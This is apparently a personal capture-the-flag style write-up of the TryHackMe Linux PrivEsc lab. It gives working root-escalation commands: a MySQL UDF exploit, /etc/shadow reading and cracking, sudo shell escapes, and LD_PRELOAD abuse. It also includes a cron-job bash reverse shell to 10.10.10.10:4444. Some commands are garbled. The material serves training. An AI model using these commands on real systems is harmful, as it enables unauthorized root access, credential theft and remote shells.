---
description: >-
  Today is my Day 1 and I am going to solve machine named Linux PrivEsc on
  TryHackMe lets goo!!!!
---

# Day 1 — Linux PrivEsc

{% embed url="https://miro.medium.com/v2/resize:fit:640/format:webp/0*k-2t2eWJ08uuoBjZ.gif" %}

{% hint style="info" %}
**misconfigured** Debian VM with multiple ways to get root! SSH is available. <mark style="color:red;">**Credentials: user:password321**</mark>
{% endhint %}

### Service Exploits

**using nmap** \


<figure><img src="../../../../../.gitbook/assets/image (94).png" alt=""><figcaption><p>open ports</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
cd /home/user/tools/mysql-udf
gcc -g -c  raptor_udf2.c  -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
{% endcode %}

**I found misconfiger in sql login with out password**

{% hint style="info" %}
Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit:
{% endhint %}

A user-defined function (UDF) is a [function](https://en.wikipedia.org/wiki/Function\_\(programming\)) provided by the user of a program or environment, in a context where the usual assumption is that functions are built into the program or environment. UDFs are usually written for the requirement of its creator.

```bash
mysql -u root
```

<figure><img src="../../../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

#### What is BLOB in MySQL?

BLOB, which stands for a **Binary Large Object**, is a MySQL data type that can store images, PDF files, multimedia, and other types of binary data.

<figure><img src="../../../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
/tmp/rootbash -p
```

<figure><img src="../../../../../.gitbook/assets/image (97).png" alt=""><figcaption><p>SERVICE EXPLOIT</p></figcaption></figure>

### Weak File Permissions - Readable /etc/shadow

**Read only => r**

{% code lineNumbers="true" %}
```bash
ll /etc/shadow
cat /etc/shadow
#hash root in file using nano
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

**What hashing algorithm was used to produce the root user's password hash?**

```
cat hash | hashid
```

<figure><img src="../../../../../.gitbook/assets/image (99).png" alt=""><figcaption><p><strong>SHA-512  Crypt</strong></p></figcaption></figure>

### Weak File Permissions - Writable /etc/shadow

**Write only**

{% code lineNumbers="true" %}
```bash
ll /etc/shadow
cat /etc/shadow
mkpasswd -m sha-512 newpasswordhere #=> read only
or 
openssl passwd newpasswordhere => #wite only
su root

```
{% endcode %}

Generate a new password hash with a password of your choice:

<mark style="color:green;">**`mkpasswd -m sha-512 newpasswordhere`**</mark>\


<mark style="color:green;">**`openssl passwd newpasswordhere`**</mark>

### Sudo - Shell Escape Sequences

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with “sudo” as a function, you can use it to elevate privileges, usually via an escape sequence.

```bash
#vim
sudo vim -c ':!/bin/bash'

#nano 
sudo nano -s /bin/bash
/bin/bash
^T
#apache2
sudo apache2 -f /etc/shadow #=> crack the hash and gain the root
```

## Task 7 — Sudo — Environment Variables <a href="#a6ec" id="a6ec"></a>

Using LD\_PRELOAD

```basic
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 sudo LD_PRELOAD=/tmp/preload.so apache2
```

`ldd /usr/sbin/apache2`

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

### Cron Jobs - File Permissions

```bash
cat /etc/cronta

#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

using nc  in kali

```bash
nc -nvlp 4444
```

### Cron Jobs - PATH Environment Variable

**Note that the PATH variable starts with /home/user which is our user's home directory.**

**Create a file called overwrite.sh in your home directory with the following contents:**

```bash
cat /etc/crontab

#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

<mark style="color:green;">**`chmod +x /home/user/overwrite.sh`**</mark>

```basic
/tmp/rootbash -p
```
